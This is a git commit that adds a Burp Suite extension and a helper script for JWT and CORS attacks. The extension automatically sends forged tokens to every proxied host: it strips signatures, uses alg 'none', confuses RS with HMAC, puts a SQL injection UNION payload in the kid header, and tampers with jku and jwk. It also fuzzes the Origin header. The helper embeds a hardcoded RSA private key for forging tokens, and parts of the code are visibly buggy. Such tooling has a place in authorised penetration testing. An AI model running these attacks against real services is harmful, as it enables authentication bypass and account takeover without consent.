799cc4f4cc4cfd28c77b88afcb8ebad166950708
secnotsec <46722376+secnotsec@users.noreply.github.com>
2020-11-21 12:15:51 +0100

    Add files via upload

---
+++ FEXT.py
@@ -0,0 +1,355 @@
+
+
+from burp import IBurpExtender
+from burp import IMessageEditorTab
+from burp import IMessageEditorTabFactory
+import base64
+import sys
+from burp import IHttpListener
+import re
+from java.net import URL
+from burp import IHttpRequestResponse
+import json
+import jwt
+import subprocess
+import re
+from config import *
+import string
+
+class BurpExtender(IBurpExtender, IHttpListener, IHttpRequestResponse):
+    ''' Implements IBurpExtender for hook into burp and inherit base classes.
+     Implement IMessageEditorTabFactory to access createNewInstance.
+    '''
+
+    def registerExtenderCallbacks(self, callbacks):
+
+        # required for debugger: https://github.com/securityMB/burp-exceptions
+        sys.stdout = callbacks.getStdout()
+
+        # keep a reference to our callbacks object
+        self._callbacks = callbacks
+
+        # obtain an extension helpers object
+        # This method is used to obtain an IExtensionHelpers object, which can be used by the extension to perform numerous useful tasks
+        self._helpers = callbacks.getHelpers()
+
+        # set our extension name
+        callbacks.setExtensionName("Hscan")
+
+        callbacks.registerHttpListener(self)
+
+        self.checked_URL = []
+        self.EncryptionAlg = {"RS256":"HMAC256", "RS384": "HMAC384", "RS512": "HMAC512"}
+        self.attack_scenarios = ["WIPE", "none", "TOHMAC", "KIDSQLi", "JKU", "JWKH"]
+        self.public_key = '''
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAl02jsZRcv9e0U7gRrhio
+H4ZegmLNmRlu71CB/+eVBwyWuNmOPtMgp6kPqgkxXpJjWh2dSfeTa48pBSlxioSV
+VmExXtAjHr54fYQvolSMiSbyeaZIScKkOBZ8t+6xl/nXlTzI1d+su+tBlHMB3F66
+Dz7eHwd+Hu5bLKhnKS6qkrpMB5oNcLClkpXYuTU23ulEiNw4sBmQ+NUqTPkzJ6Se
+i8XVbV72/e7SGJlYSZcWRQ3QyGMV+GhwIYm0Q0Dlm9pAtOUYoQHBF7aTXv6ZEWR8
+YntjLA0X7PIpHhtHf2OyJ9UBRCdKSteDIlLAorpGgS/PL1CrlhIYfwb4AMPWW4eY
+oQIDAQAB
+-----END PUBLIC KEY-----
+'''
+
+
+        return
+
+
+    def _handle_response_(self, _resp_headers, _pos_, resp_fields):
+
+        _item_found = {}
+        if _pos_ != None:
+            __msg__ = _resp_headers[_pos_]
+        else:
+            __msg__ = {header.split(" ")[0].replace(":",""):header.split(":")[1] for header in _resp_headers if header.split(" ")[0].replace(":","") in resp_fields}
+
+        return __msg__
+
+
+    def _valid_(self, code):
+        if ["200", "202", "201", "204"].__contains__(code):
+            return True
+
+
+    def strip_RM(self, string):
+        return string.split(" ")[1]
+
+
+    def issue_req(self, URL, modified_headers, body):
+        message = self._helpers.buildHttpMessage(modified_headers, self._helpers.stringToBytes(body))
+        response = self._callbacks.makeHttpRequest(URL.getHost(), 443, True, message)
+        response_info = self._helpers.analyzeResponse(response)
+        req_hdrs = response_info.getHeaders()
+        return req_hdrs
+
+
+    def empty_hdr(self, hdrs):
+        
+        i = 0
+        j = 0
+        while i <= (len(hdrs)+j-1):
+            del hdrs[0]
+            i =+ 1
+            j =+ 1
+
+    def HMAC512(self, header, payload, key):
+        return jwt.encode(payload, key, algorithm='HS512', headers=header)
+
+    def HMAC256(self, header, payload, key):
+        return jwt.encode(payload, key, algorithm='HS256', headers=header)
+
+    def HMAC384(self, header, payload, key):
+        return jwt.encode(payload, key, algorithm='HS384', headers=header)
+
+    def RSA_Algorithms(self, payload, algo, header):
+        cmd = "python -W ignore "+os.getcwd()+"/JWTGen.py '"+json.dumps(payload).replace(" ","")+"' "+algo+" '"+json.dumps(header).replace(" ","")+"'"
+        return subprocess.Popen(cmd.split(" "),stdout=subprocess.PIPE).stdout.readlines()[0].replace("\n","")
+
+    def checks(self, URL, case, headersx, body):
+
+        Modheaders = []
+        Algs = {"RS256":"HMAC256", "RS384": "HMAC384", "RS512": "HMAC512"}
+        eval_safe_list = dict([ (key, locals().get(key, eval("self."+Algs[key]))) for key in Algs])
+
+        if case == "WIPE":
+            self.empty_hdr(Modheaders)
+            for hdr in headersx:
+                if "Authorization:" in hdr:
+                    Modheaders.append(hdr.replace(hdr.split(" ")[2].split(".")[2], ""))
+                else:
+                    Modheaders.append(hdr)
+
+            _resp = self.issue_req(URL, Modheaders, body)
+
+            if self._valid_(self._handle_response_(_resp, 0, {}).split(" ")[1]):
+                self._callbacks.printOutput(self._handle_response_(_resp, 0, {}).split(" ")[1])
+            else:
+                self._callbacks.printOutput(self._handle_response_(_resp, 0, {}).split(" ")[1])
+
+        elif case == "none":
+            self.empty_hdr(Modheaders)
+            for hdr in headersx:
+                if "Authorization:" in hdr:
+                    njwt_hdr = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
+                    njwt_hdr["alg"] = "none"
+                    Modheaders.append(hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+base64.b64encode(json.dumps(njwt_hdr)).replace("=","")+'.'.join(hdr.split(" ")[2].split(".")[:2]))
+                else:
+                    Modheaders.append(hdr)
+
+            _resp = self.issue_req(URL, Modheaders, body)
+
+            if self._valid_(self._handle_response_(_resp, 0, {}).split(" ")[1]):
+                self._callbacks.printOutput(self._handle_response_(_resp, 0, {}).split(" ")[1])
+            else:
+                self._callbacks.printOutput(self._handle_response_(_resp, 0, {}).split(" ")[1])
+
+
+        elif case == "TOHMAC":
+            self.empty_hdr(Modheaders)
+            for hdr in headersx:
+                if "Authorization:" in hdr:
+                    JWT_H = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
+                    if JWT_H.__contains__("jwk"):
+                        del JWT_H["typ"]
+                        del JWT_H["alg"]
+                        JWT_P = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[1]+"==="))
+                        for alg in self.EncryptionAlg:
+                            if JWT_H["alg"] == alg:
+                                njwt_hdr = eval("self."+self.EncryptionAlg[alg]+"({}, {}, {})".format(JWT_P, JWT_P, JWT_H["jwk"]))
+                                njwt_hdr = hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+njwt_hdr
+                                Modheaders.append(njwt_hdr)
+                                break
+                else:
+                    Modheaders.append(hdr)
+
+            _resp = self.issue_req(URL, Modheaders, body)
+
+            if self._valid_(self._handle_response_(_resp, 0, {}).split(" ")[1]):
+                self._callbacks.printOutput(self._handle_response_(_resp, 0, {}).split(" ")[1])
+            else:
+                self._callbacks.printOutput(self._handle_response_(_resp, 0, {}).split(" ")[1])
+
+
+        elif case == "KIDSQLi":
+            self.empty_hdr(Modheaders)
+            for hdr in headersx:
+                if "Authorization:" in hdr:
+                    JWT_H = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
+                    if JWT_H.__contains__("kid"):
+                        JWT_H["kid"] = "BULK'/*X*/UNION/*X*/SELECT/*X*/'{}'--".format(self.public_key.replace(" ", "/**/"))
+                        del JWT_H["typ"]
+                        JWT_P = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[1]+"==="))
+                        for alg in self.EncryptionAlg:
+                            if JWT_H["alg"] == alg:
+                                del JWT_H["alg"]
+                                njwt_hdr = self.RSA_Algorithms(JWT_P, alg, JWT_H)
+                                njwt_hdr = hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+njwt_hdr
+                                Modheaders.append(njwt_hdr)
+                                break
+
+                else:
+                    Modheaders.append(hdr)
+
+            _resp = self.issue_req(URL, Modheaders, body)
+
+            if self._valid_(self._handle_response_(_resp, 0, {}).split(" ")[1]):
+                self._callbacks.printOutput(self._handle_response_(_resp, 0, {}).split(" ")[1])
+            else:
+                self._callbacks.printOutput(self._handle_response_(_resp, 0, {}).split(" ")[1])
+
+        elif case == "JKU":
+            self.empty_hdr(Modheaders)
+            for hdr in headersx:
+                if "Authorization:" in hdr:
+                    JWT_H = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
+                    if JWT_H.__contains__("jku"):
+                        JWT_H["jku"] = "http://example.com/x.js"
+                        del JWT_H["typ"]
+                        JWT_P = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[1]+"==="))
+                        for alg in self.EncryptionAlg:
+                            if JWT_H["alg"] == alg:
+                                del JWT_H["alg"]
+                                njwt_hdr = self.RSA_Algorithms(JWT_P, alg, JWT_H)
+                                njwt_hdr = hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+njwt_hdr
+                                Modheaders.append(njwt_hdr)
+                                break
+                else:
+                    Modheaders.append(hdr)
+
+            self.issue_req(URL, Modheaders, body)
+
+        elif case == "JWKH":
+            self.empty_hdr(Modheaders)
+            for hdr in headersx:
+                if "Authorization:" in hdr:
+                    JWT_H = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[0]+"==="))
+                    if JWT_H.__contains__("jwk"):
+                        JWT_H["jwk"] = "{}".format(self.public_key)
+                        del JWT_H["typ"]
+                        JWT_P = json.loads(base64.b64decode(hdr.split(" ")[2].split(".")[1]+"==="))
+                        for alg in self.EncryptionAlg:
+                            if JWT_H["alg"] == alg:
+                                del JWT_H["alg"]
+                                njwt_hdr = self.RSA_Algorithms(JWT_P, alg, JWT_H)
+                                njwt_hdr = hdr.split(" ")[0]+" "+hdr.split(" ")[1]+" "+njwt_hdr
+                                Modheaders.append(njwt_hdr)
+                                break
+                else:
+                    Modheaders.append(hdr)
+
+            self.issue_req(URL, Modheaders, body)
+
+    def check_JWT_Token(self, host, headers, body):
+
+        URL_WP = "https://"+host+self.strip_RM(headers[0])
+        JAVA_F_URL = URL(URL_WP)
+        if "Authorization:" in ' '. join(headers):
+            for case in self.attack_scenarios:
+                self.checks(JAVA_F_URL, case, headers, body)
+                self.checked_URL.append(host)
+
+    def CORS_miscon(self, URL, _req_headers_, payloads, body):
+        _fresh_header = []
+        _pos = None
+        for header_field in _req_headers_:
+            if "Origin:" in header_field:
+                _pos = _req_headers_.index(header_field)
+                _fresh_header.append(header_field)
+            else:
+                _fresh_header.append(header_field)
+
+        if _pos != None:
+            for _payload in payloads:
+
+                if re.search("\.|(http)|(https)", _payload):
+                    if _fresh_header[_pos].split(" ").__contains__("www"):
+                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" https://www."+_payload+_fresh_header[_pos].split(" ")[1].replace("https://www", "")
+                    else:
+                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" https://"+_payload+_fresh_header[_pos].split(" ")[1].replace("https://", "")
+
+                    make_req = self.issue_req(URL, _fresh_header, body)
+                    self.parse_CORS_result(make_req)
+
+                if re.search("\.\w{2,3}$", _payload) and _payload.startswith("."):
+                    _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" "+_fresh_header[_pos].split(" ")[1]+_payload
+
+                    make_req = self.issue_req(URL, _fresh_header, body)
+                    self.parse_CORS_result(make_req)
+
+                if re.search("\.\w{2,3}$", _payload) and _payload[0] != ".":
+                    Origin = _fresh_header[_pos].split(" ")[1]
+                    if re.search("\.\w{3}$", Origin):
+                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" "+Origin.replace("."+Origin[len(Origin)-3:], _payload)
+                    else:
+                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" "+Origin.replace("."+Origin[len(Origin)-2:], _payload)
+
+                    make_req = self.issue_req(URL, _fresh_header, body)
+                    self.parse_CORS_result(make_req)
+
+                if _payload.endswith(".") and _payload.count(".") == 1:
+                    Origin = _fresh_header[_pos].split(" ")[1]
+                    match_wrap = re.search("https\://|http\://", Origin) 
+                    Origin = Origin.replace(match_wrap.group(0), "")
+                    spl_Origin = Origin.split(".")
+                    if len(spl_Origin) == 3:
+                        spl_Origin[0] = _payload.replace(".","")
+                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" https://"+'.'.join(spl_Origin)
+                    else:                    
+                        _fresh_header[_pos] = _fresh_header[_pos].split(" ")[0]+" https://"+_payload+'.'.join(spl_Origin)
+
+                    make_req = self.issue_req(URL, _fresh_header, body)
+                    self.parse_CORS_result(make_req)
+
+            compiled_payloads = [special_char+cases[4] for special_char in string.punctuation]
+
+            for _payload in compiled_payloads:
+                _fresh_header[_pos] = _fresh_header[_pos]+_payload
+                make_req = self.issue_req(URL, _fresh_header, body)
+                self.parse_CORS_result(make_req)
+
+    def parse_CORS_result(self, _resp_headers):
+
+        try:
+            allow_origin = self._handle_response_(_resp_headers, None, ["Access-Control-Allow-Origin", "Access-Control-Allow-Credentials"])["Access-Control-Allow-Origin"]
+        except KeyError:
+            allow_origin = None
+
+        try:
+            allow_credentials = self._handle_response_(_resp_headers, None, ["Access-Control-Allow-Origin", "Access-Control-Allow-Credentials"])["Access-Control-Allow-Credentials"]
+        except KeyError:
+            allow_credentials = None
+
+        if allow_origin != None and allow_credentials != None:
+            self._callbacks.printOutput(allow_origin+" : it's vulnerable")
+
+
+    def processHttpMessage(self, toolFlag, messageIsRequest, currentMessage):
+
+        if toolFlag == self._callbacks.TOOL_PROXY:
+            try:
+                if messageIsRequest:
+                    self.processRequest(currentMessage)
+                else:
+                    self.processResponse(currentMessage)
+            except Exception as e:
+                print (e)
+
+    def processResponse(self, currentMessage):
+        response = currentMessage.getResponse()
+        parsedResponse = self._helpers.analyzeResponse(response)
+        self._headers = parsedResponse.getHeaders()
+        body = self._helpers.bytesToString(response)[parsedResponse.getBodyOffset():]
+
+    def processRequest(self, currentMessage):
+        request = currentMessage.getRequest()
+        parsedRequest = self._helpers.analyzeRequest(request)
+        body = self._helpers.bytesToString(request)[parsedRequest.getBodyOffset():]
+        hrs = parsedRequest.getHeaders()
+        for hr in hrs:
+            if "Host" in hr:
+                Host = hr.replace("Host: ","")
+                if hr.replace("Host: ","") not in self.checked_URL:
+                    self.check_JWT_Token(Host, hrs, body)
+                self.CORS_miscon(URL("https://"+Host+self.strip_RM(hrs[0])), hrs, cases, body)
---
+++ JWTGen.py
@@ -0,0 +1,41 @@
+
+import jwt
+import sys
+import json
+
+private_key = '''
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAl02jsZRcv9e0U7gRrhioH4ZegmLNmRlu71CB/+eVBwyWuNmO
+PtMgp6kPqgkxXpJjWh2dSfeTa48pBSlxioSVVmExXtAjHr54fYQvolSMiSbyeaZI
+ScKkOBZ8t+6xl/nXlTzI1d+su+tBlHMB3F66Dz7eHwd+Hu5bLKhnKS6qkrpMB5oN
+cLClkpXYuTU23ulEiNw4sBmQ+NUqTPkzJ6Sei8XVbV72/e7SGJlYSZcWRQ3QyGMV
++GhwIYm0Q0Dlm9pAtOUYoQHBF7aTXv6ZEWR8YntjLA0X7PIpHhtHf2OyJ9UBRCdK
+SteDIlLAorpGgS/PL1CrlhIYfwb4AMPWW4eYoQIDAQABAoIBAHQEf6myVvBv6YFs
+mnoBxCDwOtYGBxsHao4tEJH2tMqD96rkf3NjFx4Yv78lb2rSG0bFgI9wPOV0EAM6
+RSrvAUgMHPxT4yo26VNtocz6wgyFBdcMD1An5R5w989eQ2WCmbGAu4tsCRrLiSzY
+hyvAozD/hvkKGMaFBPqYYwosE3WQINclpz5xwE0o1w6bC2TMG78KYc8sYLR9Dv5p
+5Zm7PRqmgDQffDj5m5MjGgJ8+EaknZHVf4tHdfELlcgBcFUEibuKLEKUIqQ7BdHn
+AGXa7l5rD45O0QyYTJmOG34OVb6B80uktPk4u4RoGGMmqF/ZPjIC/zoo2pQwCfww
+wdYQW4UCgYEAxtSJXYacjlUj13XFeOWXIlcEK5vQ+HLH/blVhj3vra4P7GGzsjNw
+9nf65QaNKfUnY0cEZNh6pn6gNvZy3kAph5WJbWZhSlL9Rouy8qvul+Dc44TkyPkt
+nxOv9BYJ76j8gcGQ2Q8rjLL2q9KQweXWuXlYT4pzurgvu8yss8dYYVMCgYEAws6/
+SighmMv4hZqeVsVWOf/OzkuR+owf/qzkWLZfhZPCf7gmm7i4ACYyO5/2bHGo+usv
+zs4HbP2BSwhFZmN5lvHobFt81XVAJNimg50brtY/TZMqc4WES4PThdfv2MX5CTBL
+qonS3llLIkVUPuPKL8BOK6eRUkN5DrDF1hMgW7sCgYBIXqe5APwO2nJ3RAiiXn7K
+Iv4DmW1QYQbmFQVKHVUV1Fs7YLx1Sj/9leIeZmoPMYoqmnjA9AKAg2pxVvasapIz
+JXyl8zPKR7akbMivh2EKqu/7aC2V8Qxn8FSE9VicgNeXqwq71se1KJacJ8JEsRGc
+5Mv995j0B4JoSrE5pn9GvQKBgA6zr7gXA0IW0rCylJST3AgQiDkFdwTjol6ECc+w
+I9Fe72TYLwG9lRVdzJi3X8+bXFdjfH4tCl5tW16gRyyNAVYk95eF6AvsB2VAfICe
+UMKHJMvj+WYyg2N3lXUacN15Q2wwGuXJ9QIW1xbFCLCeXFnyN3QP92Wv9ejn6mZX
+ly+VAoGAb56HKJ8PdabcQSTwOP+vqY5uy40btgbIzVaGwvux4EWxwm0hrGjjYMpJ
+75Mlip6MUa08QK/ojz1qzyzgkaoqOUI4hrzXXgMFIXaOdpF8b6lSBGrfTmckrlBV
+4hRBpD1P+Qu5sKcfZPna5ZKFiGL5ZMj+hRA2QfBDszoOMElu398=
+-----END RSA PRIVATE KEY-----
+'''
+
+def GenJwT(_payload_, key, algo, _headers_):
+	print jwt.encode(_payload_, private_key, algorithm=algo, headers=_headers_)
+
+
+if __name__ == '__main__':
+	GenJwT(json.loads(sys.argv[1].replace("'","")), private_key, sys.argv[2], json.loads(sys.argv[3].replace("'","")))
